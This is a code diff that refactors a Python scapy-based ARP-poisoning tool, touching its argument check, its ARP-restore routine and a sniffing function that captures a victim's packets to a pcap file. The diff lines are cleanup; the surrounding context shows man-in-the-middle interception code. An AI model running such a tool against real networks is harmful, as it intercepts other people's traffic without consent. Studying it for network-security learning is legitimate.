@@ -12,12 +12,12 @@ def get_args():
     parser.add_argument('-sniff',dest="sniff",help="Specify if you want to only capture certain packets and get it in pcap file ",required=False,action='store_true')
     parser.add_argument('-pc',metavar="Packet count",dest="packetCount",default=1000,type=int,help="Specify the packet count you want to sniff! (Use this when sniff used ), Default : 1000",required=False)
     arguments=parser.parse_args()
-    
-    if not((not arguments.sniff) or arguments.packetCount):
+
+    if arguments.sniff and not arguments.packetCount:
         print(colored("[-] Packet count should only used when sniffing option is used ! ",'red'))
         parser.print_help()
         sys.exit()
-        
+
     return arguments
 
 
@@ -26,11 +26,11 @@ def restore():
     # Crafting the packet for victim to normal stuff ! 
     # we are sending Arp reply packet in which we are saying hey user this is me this is my mac address and the packet's destination mac address goes to whole lan as this is a broadcast 
     normal_victim_packet=scapy.ARP(psrc=gatewayIp,hwsrc=gatewayMac,pdst=victimIp,hwdst="ff:ff:ff:ff:ff:ff",op=2)
-    
+
     # Doing the same for router we will send arp reply packet to gateway with details about the victim mac and ip address and this message will be send to all the clients so somehow , gateway will know that this is my client ! 
     normal_gateway_packet=scapy.ARP(psrc=victimIp,hwsrc=victimMac,pdst=gatewayIp,hwdst="ff:ff:ff:ff:ff:ff",op=2)
-    # Sending the message 7 times 
-    for i in range(7):
+    # Sending the message 7 times
+    for _ in range(7):
         scapy.send(normal_victim_packet,verbose=False)
         scapy.send(normal_gateway_packet,verbose=False)
 
@@ -103,14 +103,14 @@ def sniffing(packetCount,interface):
     print("-"*60)
     print(colored("[-] Yeah ! Sniffing some packets !!",'green'))
     print("-"*60)
-    # BPf => Berkley Packet Filters , It is a techonlogy which provides the functionality to filter the packets 
-    bpf_filter="ip host %s" % victimIp
-    
+    # BPf => Berkley Packet Filters , It is a techonlogy which provides the functionality to filter the packets
+    bpf_filter = f"ip host {victimIp}"
+
     # sniffing the packets and storing the packets 
     packets=scapy.sniff(count=packetCount,filter=bpf_filter,iface=interface)
     # This scapy function writes a list of packets into pcap file which can be later accessed by wireshark
     scapy.wrpcap('poisionedpackets.pcap',packets)
-    
+
     restore()
     posioning_process.terminate()
     print("[+] Finished , All your packets are in :poisionedpackets.pcap ")
